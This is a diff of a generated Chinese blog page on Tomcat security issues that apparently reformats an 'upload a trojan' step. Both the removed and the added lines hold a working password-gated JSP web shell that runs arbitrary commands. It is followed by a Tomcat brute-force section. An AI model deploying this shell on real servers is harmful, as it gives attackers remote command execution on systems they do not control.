@@ -47,7 +47,7 @@
 <meta property="og:image" content="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-8-15/44153330.jpg">
 <meta property="og:image" content="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-8-15/39672229.jpg">
 <meta property="og:image" content="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-8-15/41597270.jpg">
-<meta property="og:updated_time" content="2020-08-26T06:30:25.610Z">
+<meta property="og:updated_time" content="2020-08-26T06:32:49.820Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Tomcat 安全问题">
 <meta name="twitter:description" content="Tomcat 安全问题">
@@ -193,10 +193,9 @@
 </ul>
 <p><img src="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/17-9-21/13765510.jpg" alt=""></p>
 <ul>
-<li><p>上传一木马</p>
-<p>&lt;% if(“023”.equals(request.getParameter(“pwd”))){ java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(“i”)).getInputStream(); int a = -1; byte[] b = new byte[2048]; out.print(“<pre>“); while((a=in.read(b)) !=1){ out.println(new String(b)); } out.print(“</pre>“); } %&gt;</p>
-</li>
+<li>上传一木马</li>
 </ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;% if(&quot;023&quot;.equals(request.getParameter(&quot;pwd&quot;)))&#123; java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(&quot;i&quot;)).getInputStream(); int a = -1; byte[] b = new byte[2048]; out.print(&quot;&lt;pre&gt;&quot;); while((a=in.read(b)) !=1)&#123; out.println(new String(b)); &#125; out.print(&quot;&lt;/pre&gt;&quot;); &#125; %&gt;</span><br></pre></td></tr></table></figure>
 <p><img src="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/17-9-21/96541990.jpg" alt=""></p>
 <h3 id="Tomcat-爆破"><a href="#Tomcat-爆破" class="headerlink" title="Tomcat 爆破"></a>Tomcat 爆破</h3><p>登录处进行抓包。<img src="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-8-15/16485310.jpg" alt=""></p>
 <p><img src="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-8-15/48292404.jpg" alt=""></p>
@@ -225,7 +224,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/09/21/Tomcat2/" data-id="ckeb01kxy0041nsxdp7vlnxq3" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2018/09/21/Tomcat2/" data-id="ckeb050pp004aroxdbyg3nk3y" class="article-share-link">Share</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Tomcat/">Tomcat</a></li></ul>
